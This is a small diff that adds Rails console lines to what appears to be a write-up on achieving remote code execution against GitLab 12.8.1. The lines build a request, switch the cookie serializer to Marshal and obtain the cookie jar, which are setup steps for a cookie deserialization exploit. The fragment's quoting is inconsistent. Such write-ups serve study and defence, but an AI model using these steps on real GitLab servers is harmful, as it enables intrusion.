@@ -235,6 +235,18 @@ Now for create exploit RCE we need to up docker with gitlab version 12.8.1 in an
 
 ``
 
+``
+``
+``
+
+'request = ActionDispatch::Request.new(Rails.application.env_config)'
+
+'request.env["action_dispatch.cookies_serializer"] = :marshal`
+
+`cookies = request.cookie_jar`
+
+
+
 # Privilege Escalation
 
 # Result and Resources
